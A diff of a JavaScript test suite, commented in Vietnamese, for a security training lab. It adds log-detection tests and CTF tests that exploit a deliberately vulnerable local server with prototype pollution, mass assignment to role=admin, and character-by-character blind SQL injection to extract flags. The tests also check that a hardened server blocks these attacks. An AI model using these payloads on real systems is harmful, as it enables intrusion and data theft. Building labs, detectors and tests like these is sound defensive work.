@@ -74,6 +74,24 @@ test('detect: brute-force — ≥5 POST /login từ cùng IP', () => {
   assert.ok(!few.findings.some((f) => f.type === 'brute-force'));
 });
 
+test('detect: pattern LAB-16..20 — proto/mass/blind/reset đều bắt trên path đã encode', () => {
+  const log = [
+    { t: 1, method: 'POST', path: '/api/config', ua: 'x', ip: '10.0.0.1' },
+    { t: 2, method: 'POST', path: '/api/register?role=admin', ua: 'x', ip: '10.0.0.1' },
+    // path TRONG LOG là raw/encoded — %27 thay ', %20 thay space
+    { t: 3, method: 'GET', path: '/track?code=AB-100%27%20AND%201%3D1%20--', ua: 'x', ip: '10.0.0.1' },
+    { t: 4, method: 'GET', path: "/track?code=AB-100' AND substr(flag,1,1)='F' --", ua: 'x', ip: '10.0.0.1' },
+    { t: 5, method: 'GET', path: '/api/reset/request?user=alice', ua: 'x', ip: '10.0.0.1' },
+    // benign — không được bắt nhầm
+    { t: 6, method: 'GET', path: '/track?code=AB-100', ua: 'x', ip: '10.0.0.1' },
+    { t: 7, method: 'GET', path: '/api/register', ua: 'x', ip: '10.0.0.1' },
+  ];
+  const types = analyzeLog(log).findings.map((f) => f.type);
+  assert.ok(types.includes('mass-assign'), 'mass-assign phải bắt ?role=admin');
+  assert.ok(types.includes('blind-sqli'), 'blind-sqli phải bắt cả path %20-encoded lẫn raw');
+  assert.ok(types.includes('reset-probe'), 'reset-probe phải bắt /api/reset/');
+});
+
 // ---------- CTF tích hợp: vuln giải được, hardened chặn ----------
 
 let vulnServer;
@@ -95,12 +113,12 @@ after(() => {
   hardServer.close();
 });
 
-test('CTF: liệt kê 7 thử thách, tổng 170 điểm, cờ per-instance', async () => {
+test('CTF: liệt kê 10 thử thách, tổng 265 điểm, cờ per-instance', async () => {
   const list = await listChallenges(vulnUrl);
   assert.equal(list.enabled, true);
-  assert.equal(list.challenges.length, 7);
-  assert.equal(list.total, 170);
-  assert.ok(list.challenges.every((c) => /FLAG|traversal|SQL|apiKey|admin|SECLAB|jwt|file/i.test(c.hint)));
+  assert.equal(list.challenges.length, 10);
+  assert.equal(list.total, 265);
+  assert.ok(list.challenges.every((c) => /FLAG|traversal|SQL|apiKey|admin|SECLAB|jwt|file|track|proto|role|md5/i.test(c.hint)));
 });
 
 test('CTF: cờ khác nhau giữa hai phiên lab khác nhau', async () => {
@@ -145,7 +163,7 @@ test('CTF: nộp đúng cờ → điểm tăng; nộp sai → ok=false', async (
   const again = await submitFlag(vulnUrl, 4, flag);
   assert.equal(again.ok, true);
   assert.equal(again.score, 20);
-  assert.ok(list.total === 170);
+  assert.ok(list.total === 265);
 });
 
 test('CTF #5: command injection đọc được cờ trong biến môi trường', async () => {
@@ -181,6 +199,59 @@ test('CTF #7: XXE entity đọc flag-xxe.txt trên filesystem ảo', async () =>
   });
   const j = await res.json();
   assert.match(j.items[0], /FLAG\{xxe-[0-9a-f]+\}/);
+});
+
+test('CTF #8: prototype pollution làm lộ cờ ở GET /api/config', async () => {
+  const clean = await (await fetch(vulnUrl + '/api/config')).json();
+  assert.equal(clean.flag, undefined, 'chưa pollute không được có cờ');
+  await fetch(vulnUrl + '/api/config', {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: '{"__proto__":{"isAdmin":true}}',
+  });
+  const j = await (await fetch(vulnUrl + '/api/config')).json();
+  assert.ok(j.protoPolluted.includes('isAdmin'));
+  assert.match(j.flag, /FLAG\{proto-[0-9a-f]+\}/);
+  // side effect nhiễm thật trên prototype toàn cục của process lab
+  assert.equal({}.isAdmin, true);
+  delete Object.prototype.isAdmin; // dọn cho các test sau
+});
+
+test('CTF #9: mass assignment tự set role=admin → /api/me trả cờ', async () => {
+  const reg = await fetch(vulnUrl + '/api/register?role=admin', {
+    method: 'POST',
+    headers: { 'content-type': 'application/x-www-form-urlencoded' },
+    body: 'username=ctfhacker&password=pw12345',
+  });
+  const j = await reg.json();
+  assert.equal(j.user.role, 'admin');
+  const login = await fetch(vulnUrl + '/login', {
+    method: 'POST',
+    headers: { 'content-type': 'application/x-www-form-urlencoded' },
+    body: 'username=ctfhacker&password=pw12345',
+  });
+  const sid = (login.headers.get('set-cookie') || '').match(/session=([a-f0-9]+)/)?.[1];
+  const me = await (await fetch(vulnUrl + '/api/me', { headers: { cookie: `session=${sid}` } })).json();
+  assert.match(me.flag, /FLAG\{mass-[0-9a-f]+\}/);
+});
+
+test('CTF #10: blind SQLi rút cờ từng ký tự qua oracle /track', async () => {
+  // oracle: 200 "TỒN TẠI" vs 404 — xác nhận
+  const yes = await fetch(vulnUrl + `/track?code=${encodeURIComponent("AB-100' AND 1=1 --")}`);
+  const no = await fetch(vulnUrl + `/track?code=${encodeURIComponent("AB-100' AND 1=2 --")}`);
+  assert.equal(yes.status, 200);
+  assert.match(await yes.text(), /TỒN TẠI/);
+  assert.equal(no.status, 404);
+  // rút 4 ký tự đầu cờ (FLAG) + vị trí 6-10 là "blind-"
+  const probe = async (n, ch) => {
+    const q = `AB-100' AND (SELECT substr(flag,${n},1) FROM ctf_blind)='${ch}' --`;
+    const r = await fetch(vulnUrl + `/track?code=${encodeURIComponent(q)}`);
+    return r.status === 200;
+  };
+  for (const [n, ch] of [[1, 'F'], [2, 'L'], [5, '{'], [10, 'd']]) {
+    assert.ok(await probe(n, ch), `substr(flag,${n}) phải là '${ch}'`);
+  }
+  assert.equal(await probe(1, 'Z'), false);
 });
 
 test('CTF: hardened TẮT — /_lab/challenges enabled:false và verify 403', async () => {
